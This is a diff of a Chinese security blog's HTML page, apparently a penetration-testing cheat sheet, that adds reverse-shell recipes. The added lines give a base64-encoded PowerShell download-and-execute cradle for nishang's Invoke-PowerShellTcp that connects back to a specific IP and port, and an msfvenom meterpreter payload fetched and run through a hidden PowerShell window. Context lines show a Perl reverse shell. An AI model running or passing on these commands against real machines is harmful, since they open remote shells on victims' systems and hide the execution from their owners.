@@ -50,7 +50,7 @@
 
 <meta itemprop="datePublished" content="2021-01-01T21:28:36&#43;08:00" />
 <meta itemprop="dateModified" content="2021-01-01T21:28:36&#43;08:00" />
-<meta itemprop="wordCount" content="1021">
+<meta itemprop="wordCount" content="1133">
 
 
 
@@ -131,7 +131,7 @@
         <div class="post-category">
             <a href="/categories/security/"> security </a>
             </div>
-          <span class="more-meta"> 约 1021 字 </span>
+          <span class="more-meta"> 约 1133 字 </span>
           <span class="more-meta"> 预计阅读 3 分钟 </span>
         <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
       </div>
@@ -227,6 +227,42 @@ perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=1234;socket(S,PF_INET,SOCK_STRE
 
 <p>靶机： <code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress [ip] -Port 9999&quot;</code></p>
 
+<p>（4）powershell base64</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">$fileContent = &#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 9999&#34;
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($fileContent)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+echo $encodedCommand
+
+# 靶机执行如下命令
+powershell -nop -noni -w hidden -exec bypass -enc [Base64Str]</pre></td></tr></table>
+</div>
+</div>
+<p>（5）msfvenom生成反弹powershell并执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=49.xxx.xxx.xxx lport=4578 -f psh-reflection -o shell.ps1
+
+// 靶机执行
+powershell -windowstyle hidden -exec bypass -c &#34;IEX (New-Object Net.WebClient).DownloadString(&#39;http://49.xxx.xxx.xxx:8080/shell.ps1&#39;)&#34;</pre></td></tr></table>
+</div>
+</div>
 <h2 id="提权">提权</h2>
 
 <h3 id="suid提权">SUID提权</h3>
